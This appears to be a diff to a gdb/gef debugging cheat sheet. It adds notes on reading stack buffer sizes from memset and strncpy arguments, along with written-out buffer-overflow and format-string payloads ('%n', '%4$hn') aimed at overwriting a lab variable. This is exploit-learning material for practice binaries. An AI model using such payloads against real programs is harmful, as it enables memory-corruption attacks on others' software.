@@ -47,6 +47,12 @@
 
 ### Print
 ```
+gef➤  print &changeme
+$2 = (int *) 0x601050 <changeme>
+
+gef➤  print changeme
+$3 = 0xff
+
 gef➤  print "foobar"
 $1 = "foobar"
 
@@ -190,6 +196,61 @@ $7 = 0xb7ffd020
 ```
 (gdb) ptype /o struct locals
 ```
+### Understanding a Stack
+##### Find size of buffer ( memset )
+`disassemble main` and find useful `apis`.  For example, if `memset` is called:
+
+> void *memset(void *b, int c, size_t len);
+
+If you break on the `memset` call, you find two useful things; the address of `buffer` and the `length` of the buffer.
+```
+memset@plt (
+   $rdi = 0x00007fffffffe440 → 0x0000000000000000,
+   $rsi = 0x0000000000000000,
+   $rdx = 0x0000000000000100,
+   $rcx = 0x00007ffff7af4154 → 0x5477fffff0003d48 ("H="?)
+)
+```
+The third value, the buffer length is represented in hex.  You can see the `buffer` is `256` chars long.
+```
+gef➤  p/d 0x100
+$4 = 256
+```
+##### Find size of buffer ( strncpy )
+The second API call is `strncpy`.  This is less famous than `strcpy`.  The latter doesn't have the `strncpy's len` argument to mitigate buffer overflows:
+
+> char * strncpy(char * dst, const char * src, size_t len);
+
+If we break on `strncpy`.  It was passed:
+```
+strncpy@plt (
+   $rdi = 0x00007fffffffe440 → 0x0000000000000000,
+   $rsi = 0x00007fffffffe851 → "%256xAAAAAAAAAAAAAAAA",
+   $rdx = 0x0000000000000100        <-- 256 char buffer
+)
+```
+That re-confirms the address of the buffer and it's length of `256` characters.
+##### Breakpoint fires
+Get target memory from `memset` argument one or you can find the `Frame Pointer` and subtract the size of the `buffer` like this: `p/x $rbp - 0x100`
+##### Target register
+`0x00007fffffffe350`
+##### Run a buffer filling payload
+`run $(python -c 'print "\x41"*252 + "\x54\x10\x60\x00" + "%n"')`
+##### Watch memory
+`memory watch p/x $rbp - 0x100 10 qword`
+##### Print each byte
+`x/256bx 0x00007fffffffe350`
+##### Print only the buffer
+`x/64wx 0x00007fffffffe350`
+##### Get stack size
+`set $stack_size = $rbp - $rsp`         # 272
+##### Calculate max overflow
+`p/d $stack_size -256`                  # 16
+##### Print stack
+`x/272wx $rsp`
+##### Result
+`AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?@Better luck next time!`
+
 ### Buffer filling
 Useful when trying to overfill a buffer with `gets` / `strcpy` or an `environment variable`
 ```
@@ -210,6 +271,8 @@ r payload.txt
 run $(python -c 'print "A" * 20')
 
 run $(python -c 'print "%268x" + "\x41\x41\x41\x41"')
+
+run `printf "\x54\x10\x60"`%.fx%4\$hn%.ex%5\$hn
 
 run $(echo -e "\x54\x10\x60\x00%x%x%x%x%x%x%x%x%x%x%x%n.")
 ```
